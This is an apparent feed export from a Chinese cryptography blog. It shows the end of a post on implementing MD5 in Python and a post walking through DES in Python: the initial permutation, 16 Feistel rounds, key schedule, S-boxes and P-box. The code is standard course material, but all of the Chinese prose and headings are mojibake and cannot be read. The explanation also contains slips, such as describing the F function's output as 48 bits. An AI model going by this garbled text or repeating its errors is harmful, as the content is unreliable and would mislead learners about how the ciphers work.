class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span></span><br><span class="line">        ]</span><br><span class="line">lrot = <span class="keyword">lambda</span> x,n: (x &lt;&lt; n)|(x &gt;&gt; <span class="number">32</span>- n)</span><br><span class="line"><span class="comment">#ä½¿ç”¨æ­£å¼¦å‡½æ•°äº§ç”Ÿçš„ä½éšæœºæ•°ï¼Œä¹Ÿå°±æ˜¯ä¹¦æœ¬ä¸Šçš„T[i]</span></span><br><span class="line">k =  [int(math.floor(abs(math.sin(i + <span class="number">1</span>)) * (<span class="number">2</span> ** <span class="number">32</span>))) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>)]</span><br><span class="line">tmp = b + lrot((a + f + k[i] + w[flag])&amp; <span class="number">0xffffffff</span>,r[i])</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>ä»¥â€helloworldâ€ä¸ºä¾‹ï¼Œåˆ†åˆ«å°†å…¶åœ¨ä»£ç ä¸­è¿è¡Œï¼Œä»¥åŠçº¿ä¸Šå·¥å…·è¿è¡Œï¼Œæ£€æŸ¥å®ƒä»¬çš„ä¸€è‡´æ€§ã€‚</p><p><a href="https://imgchr.com/i/F52mzn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52mzn.png" alt="F52mzn.png"></a></p><p><a href="https://imgchr.com/i/F52AIg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F52AIg.png" alt="F52AIg.png"></a></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šMD5å®ç°"><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šMD5å®ç°" class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šMD5å®ç°"></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">MD5å®ç°</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h3&gt;&lt;p&gt;MD5æ¶ˆæ¯æ‘˜è¦ç®—æ³•ä¸€ç§è¢«å¹¿æ³›ä½¿ç”¨çš„å¯†ç æ•£åˆ—å‡½æ•°ï¼Œè¾“å…¥é•¿åº¦å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ï¼Œæˆ‘çš„ä»£ç ä¹Ÿæ˜¯ä»¥å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ä¸ºä¾‹ï¼Œè¾“å‡ºä¸€ä¸ª128ä½ï¼ˆ16å­—èŠ‚ï¼‰çš„æ•£åˆ—å€¼
    
    </summary>
    
      <category term="å¯†ç å­¦" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="å¯†ç å­¦" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>DESåŸç†åŠPythonå®ç°</title>
    <link href="0verwatch.top/DES-python.html"/>
    <id>0verwatch.top/DES-python.html</id>
    <published>2019-01-12T08:21:38.000Z</published>
    <updated>2019-01-12T08:22:50.813Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>DESæ˜¯åˆ†ç»„å¯†ç çš„ä¸€ç±»ï¼Œæ˜¯ä¸€ç§å¯¹ç§°å¯†ç æŠ€æœ¯ï¼Œä½¿ç”¨äº†Feistelçš„ç½‘ç»œç»“æ„<a id="more"></a>ï¼Œå°†æ˜æ–‡åˆ†æˆå¤šä¸ªç­‰é•¿æ¨¡å—ï¼Œä½¿ç”¨ç¡®å®šçš„ç®—æ³•ä»¥åŠå¯¹ç§°å¹¶ä¸”ç›¸åŒçš„å¯†é’¥å¯¹æ˜å¯†æ–‡è¿›è¡ŒåŠ è§£å¯†ã€‚</p><p><img src="https://s2.ax1x.com/2019/01/01/F5u1LF.png" alt="F5u1LF.png"></p><h3 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h3><ol><li>64ä½çš„æ˜æ–‡ç»è¿‡åˆå§‹ç½®æ¢è€Œè¢«é‡æ–°æ’åˆ—ï¼Œå¹¶å°†å…¶åˆ†ä¸ºå·¦å³ä¸¤ä¸ªåˆ†ç»„L0å’ŒR0å„32ä½ã€‚</li><li>åœ¨å¯†é’¥çš„å‚ä¸ä¸‹ï¼Œæœ€å·¦å³ä¸¤ä¸ªåˆ†ç»„è¿›è¡Œ16è½®ç›¸åŒå‡½æ•°çš„è¿­ä»£ï¼Œæ¯è½®è¿­ä»£éƒ½æœ‰ç½®æ¢å’Œä»£æ¢ã€‚æ³¨æ„æœ€åä¸€è½®è¿­ä»£çš„è¾“å‡ºä¸º64ä½ã€‚å·¦åŠéƒ¨åˆ†å’Œå³åŠéƒ¨åˆ†ä¸è¿›è¡Œäº¤æ¢ã€‚</li><li>æœ€åçš„é¢„è¾“å‡ºå†é€šè¿‡é€†åˆå§‹ç½®æ¢äº§ç”Ÿ64ä½çš„å¯†æ–‡ã€‚</li><li>åŠ è§£å¯†è¿‡ç¨‹ä¸€æ ·ï¼Œåè¿‡æ¥å³å¯ï¼Œä¹Ÿå°±æ˜¯ç§˜é’¥åˆ—è¡¨å¾—å€’è¿‡æ¥ã€‚æ‰€ä»¥å¾—æ³¨æ„ä¸€ä¸‹ã€‚</li></ol><h3 id="æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ"><a href="#æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ" class="headerlink" title="æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ"></a>æ ¸å¿ƒä»£ç åŠç®—æ³•åˆ†æ</h3><p>ç¬¬ä¸€éƒ¨ç»è¿‡åˆ†æ˜¯æ˜æ–‡ç»è¿‡IPç½®æ¢çš„æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ä¸€ç»´æ•°ç»„å»å®Œæˆï¼Œè¿™éœ€è¦æ³¨æ„çš„æ˜¯æ•°ç»„ä¸‹æ ‡ä¸è¦å†™é”™ï¼Œä¼šå¯¼è‡´æ•°ç»„è¶Šç•Œï¼Œæœ€åä¸€éƒ¨åˆ†IPé€†çš„é‚£ä¸€éƒ¨åˆ†ä¹Ÿä¸€æ ·çš„é“ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]     <span class="comment">#æ•°ç»„ä¸‹æ ‡i-1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#IPé€†ç›’å¤„ç†</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_re_change</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IP_re_table:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>å†ä¸‹æ¥å°±æ˜¯ç»è¿‡16è½®è¿­ä»£çš„è¿‡ç¨‹ï¼Œæ¯ä¸€æ­¥çš„è¿­ä»£è¿‡ç¨‹é‡Œé¢åˆåŒ…å«äº†Få‡½æ•°ï¼Œè¿˜æœ‰å¯†é’¥çš„äº§ç”Ÿã€‚</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå¤§è‡´çš„è¿­ä»£è¿‡ç¨‹ï¼Œå¾ˆæ¸…æ¥šé¦–å…ˆäº§ç”Ÿäº†16è½®è¿­ä»£çš„ç§˜é’¥ï¼Œæ¯ä¸€è½®çš„è¿­ä»£éƒ½æœ‰å¯†é’¥å‚ä¸ï¼Œå¹¶ä¸”é€šè¿‡åˆ‡ç‰‡å®Œæˆäº†æ¯ä¸€è½®çš„å·¦å³åˆ†ç»„ï¼Œç„¶åå³è¾¹çš„åˆ†ç»„ä½œä¸ºäº†æ–°çš„å·¦è¾¹ï¼Œå·¦è¾¹çš„åˆ†ç»„ä»¥åŠå³è¾¹çš„åˆ†ç»„è¿˜æœ‰å¯†é’¥é€šè¿‡Få‡½æ•°çš„è®¡ç®—è·å¾—æ–°çš„å³åˆ†ç»„ï¼Œæœ€åä¸€è½®ä¸åšäº¤æ¢ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä¸ºä»€ä¹ˆåªå¾ªç¯äº†15è½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt_one</span><span class="params">(bin_message,bin_key)</span>:</span> <span class="comment">#64ä½äºŒè¿›åˆ¶åŠ å¯†çš„æµ‹è¯•</span></span><br><span class="line">    <span class="comment">#bin_message = deal_mess(str2bin(message))</span></span><br><span class="line">    mes_ip_bin = ip_change(bin_message)</span><br><span class="line">    <span class="comment">#bin_key = input_key_judge(str2bin(key))</span></span><br><span class="line">    key_lst = gen_key(bin_key)</span><br><span class="line">    mes_left = mes_ip_bin[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    mes_right = mes_ip_bin[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):</span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        f_result = fun_f(mes_tmp,key_lst[i])</span><br><span class="line">        mes_right = str_xor(f_result,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    f_result = fun_f(mes_right,key_lst[<span class="number">15</span>])</span><br><span class="line">    mes_fin_left = str_xor(mes_left,f_result)</span><br><span class="line">    mes_fin_right = mes_right</span><br><span class="line">    fin_message = ip_re_change(mes_fin_left + mes_fin_right)</span><br><span class="line">    <span class="keyword">return</span> fin_message</span><br></pre></td></tr></table></figure><p>å†çœ‹çœ‹äº§ç”Ÿå¯†é’¥çš„å…³é”®ä»£ç gen_keyï¼Œä¼ è¿›å»çš„å‚æ•°å¯†é’¥å®é™…æ˜¯64ä½çš„ï¼Œä½†å®é™…å‘æŒ¥ä½œç”¨çš„æ˜¯56ä½ï¼Œæ˜¯å› ä¸ºä»…è¿‡äº†ä¸€æ¬¡PC-1çš„ç½®æ¢ï¼Œè¿™ä¹Ÿè§£é‡Šäº†è¿™æ®µä»£ç ä¸ºä»€ä¹ˆåˆ°åé¢åˆ‡ç‰‡çš„æ—¶å€™ä»¥28ä¸ºä¸­å¿ƒåˆ†å·¦å³ã€‚ç„¶åæ ¹æ®æ˜¯ç¬¬å‡ è½®ç„¶åå¯¹å·¦å³åˆ†ç»„çš„å¯†é’¥è¿›è¡Œå¾ªç¯å·¦ç§»ï¼Œå‡ºæ¥çš„56ä½å†ç»è¿‡ä¸€æ¬¡ç½®æ¢ç”Ÿæˆ48ä½çš„å¯†é’¥ï¼Œæœ€åç”¨æ•°ç»„å°†æ‰€æœ‰å¯†é’¥éƒ½è£…å¥½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    key_list = []</span><br><span class="line">    divide_output = change_key1(key)</span><br><span class="line">    key_C0 = divide_output[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_D0 = divide_output[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> SHIFT:</span><br><span class="line">        key_c = left_turn(key_C0,i)</span><br><span class="line">        key_d = left_turn(key_D0,i)</span><br><span class="line">        key_output = change_key2(key_c + key_d)</span><br><span class="line">        key_list.append(key_output)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br></pre></td></tr></table></figure><p>PC-1ï¼ŒPC-2çš„ç½®æ¢è¿‡ç¨‹ï¼Œè·ŸIPç½®æ¢å·®ä¸å¤šï¼Œéƒ½æ˜¯åˆ©ç”¨äº†æ‰“è¡¨ç„¶åå­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç§˜é’¥çš„PC-1ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key1</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_1:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç§˜é’¥çš„PC-2ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key2</span><span class="params">(my_key)</span>:</span></span><br><span class="line">    res  = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> PC_2:</span><br><span class="line">        res += my_key[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>é‡ç‚¹è¿˜æœ‰Få‡½æ•°çš„å¤„ç†ï¼Œä¹Ÿå³æ˜¯ä»£ç é‡Œé¢çš„fun_fï¼Œè¿™é‡Œé¢ä¸»è¦æœ‰å››ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«æ˜¯æ‰©å±•ç½®æ¢ï¼Œå¯†é’¥åŠ ï¼Œç»è¿‡Sç›’çš„ä»£æ¢ï¼Œæœ€åç»è¿‡äº†Pç›’çš„ç½®æ¢ï¼Œæœ€ç»ˆæŠŠ32ä½çš„è¾“å…¥å˜æˆ48ä½çš„è¾“å‡ºã€‚Eç›’ä»¥åŠPç›’çš„ç½®æ¢ä¹Ÿæ˜¯å¾ˆç®€å•æ‰“å¥½è¡¨ç„¶åç”¨å­—ç¬¦ä¸²æ‹¼æ¥å°±å¥½ã€‚å…³é”®æ˜¯Sç›’çš„å˜æ¢åŸç†ï¼Œ6ä½çš„è¾“å…¥4ä½çš„è¾“å‡ºï¼Œè¾“å…¥å‰ä¸¤ä½ä½œä¸ºSç›’æ¨ªåæ ‡ï¼Œä¸­é—´4ä½ä½œä¸ºåˆ—ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œæ˜¯ä»¥binè¾“å‡ºå¾—æ³¨æ„ä½æ•°ä¸å¤Ÿå››ä½å¾—è¡¥é½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Få‡½æ•°çš„å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_f</span><span class="params">(bin_str,key)</span>:</span></span><br><span class="line">    first_output = e_key(bin_str)</span><br><span class="line">    second_output = str_xor(first_output,key)</span><br><span class="line">    third_output = s_box(second_output)</span><br><span class="line">    last_output = p_box(third_output)</span><br><span class="line">    <span class="keyword">return</span> last_output</span><br><span class="line"></span><br><span class="line"><span class="comment">#Eç›’ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_key</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> E:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sç›’è¿‡ç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_box</span><span class="params">(my_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(my_str),<span class="number">6</span>):</span><br><span class="line">        now_str = my_str[i:i+<span class="number">6</span>]</span><br><span class="line">        row = int(now_str[<span class="number">0</span>]+now_str[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        col = int(now_str[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        num = bin(S[c][row*<span class="number">16</span> + col])[<span class="number">2</span>:]   <span class="comment">#åˆ©ç”¨äº†binè¾“å‡ºæœ‰å¯èƒ½ä¸æ˜¯4ä½strç±»å‹çš„å€¼ï¼Œæ‰€ä»¥æ‰æœ‰ä¸‹é¢çš„å¾ªç¯å¹¶ä¸”åŠ ä¸Šå­—ç¬¦0</span></span><br><span class="line">        <span class="keyword">for</span> gz <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>-len(num)):</span><br><span class="line">            num = <span class="string">'0'</span>+ num</span><br><span class="line">        res += num</span><br><span class="line">        c  += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#Pç›’ç½®æ¢</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_box</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span>  P:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>åŠ å¯†è§£å¯†å†…å®¹éƒ½ä¼šæ”¾åˆ°æ–‡ä»¶é‡Œé¢ï¼Œç„¶åé€šè¿‡è¯»å†™æ–‡ä»¶çš„æ–¹å¼å°†å†…å®¹æˆåŠŸåŠ è§£å¯†ï¼Œä»¥â€helloworldâ€ä¸ºä¾‹ï¼Œèƒ½å¤Ÿæ­£ç¡®åŠ è§£å¯†</p><p><img src="https://s2.ax1x.com/2019/01/01/F51J8s.png" alt="F51J8s.png"></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šDESåŠ è§£å¯†"><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šDESåŠ è§£å¯†" class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šDESåŠ è§£å¯†"></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">DESåŠ è§£å¯†</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h3&gt;&lt;p&gt;DESæ˜¯åˆ†ç»„å¯†ç çš„ä¸€ç±»ï¼Œæ˜¯ä¸€ç§å¯¹ç§°å¯†ç æŠ€æœ¯ï¼Œä½¿ç”¨äº†Feistelçš„ç½‘ç»œç»“æ„
    
    </summary>
    
      <category term="å¯†ç å­¦" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="å¯†ç å­¦" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
</feed>
